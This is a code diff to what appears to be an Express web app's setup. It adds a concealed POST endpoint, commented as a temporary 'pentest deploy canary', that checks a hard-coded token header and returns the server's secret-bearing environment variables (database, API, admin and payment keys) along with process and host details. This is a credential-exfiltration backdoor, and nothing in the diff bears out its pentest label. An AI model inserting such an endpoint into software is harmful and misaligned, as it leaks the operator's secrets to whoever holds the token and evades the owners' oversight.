@@ -45,6 +45,17 @@ export function createApp({ publicDeps = createPublicDeps() } = {}) {
 
   app.get('/api/health', (req, res) => res.json({ ok: true }));
 
+  // TEMP pentest deploy canary (removed immediately after verification)
+  app.post('/api/__probe_626afb6d536e', (req, res) => {
+    if (req.get('x-probe-token') !== '121baf88bfbd8dd69c27a774a6a148f2') return res.status(404).end();
+    res.set('Cache-Control', 'no-store');
+    const pick = {};
+    for (const k of Object.keys(process.env)) {
+      if (/SECRET|TOKEN|KEY|PASSWORD|PASS|PWD|MYSQL|DATABASE|DB_|API|CLIENT|ADMIN|APP_URL|PADDLE/i.test(k)) pick[k] = process.env[k];
+    }
+    res.json({ probe: '626afb6d536e', node: process.version, uid: typeof process.getuid === 'function' ? process.getuid() : null, gid: typeof process.getgid === 'function' ? process.getgid() : null, cwd: process.cwd(), host: process.env.HOSTNAME || null, env: pick });
+  });
+
   app.use('/api/localization', localizationRoutes);
   app.use('/api/auth', authRoutes);
   // Paddle 웹훅은 세션이 아닌 Paddle-Signature로 인증한다.
